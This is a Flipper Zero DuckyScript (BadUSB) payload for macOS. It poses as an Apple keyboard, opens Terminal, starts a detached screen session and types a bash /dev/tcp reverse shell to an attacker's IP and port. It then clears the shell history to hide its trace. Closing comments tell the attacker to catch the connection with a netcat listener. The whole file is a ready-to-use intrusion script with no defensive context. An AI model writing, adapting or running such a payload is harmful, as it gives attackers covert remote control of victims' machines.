REM Author: 47LeCoste
REM Version 1.0 (Flipper Ducky)
REM Now, with the following line, let's tell the macOS that our FlipperZero is an Apple KB. If you’re not using it, the macOS will displays the "Keyboard Setup Assistant" dialog and your script will go fuck itself.
ID 05ac:021e Apple:Keyboard
REM Open a Terminal's window
DELAY 3000
GUI SPACE
DELAY 500
STRING terminal.app
DELAY 200
ENTER
DELAY 2000
REM Let's make this terminal permanent, even if u quit the application
STRING screen bash
DELAY 200
ENTER
DELAY 200
REM Execute the reverse shell (change the IP and the PORT to YOUR SERVER'S(ATTACKER'S) IP and PORT), and delete these lasts lines from .bash_history
STRING bash -i>& /dev/tcp/0.0.0.0/3333 0>&1; history -r
DELAY 1000
REM Let’s go back to your session, keeping in execution the screen’s one
CTRL a d 
GUI q
REM After all, on the attacking machine (with netcat installed) open a new terminal and digit ‘nc -nlvp 3333’ (changing 3333 with the PORT u are listening.
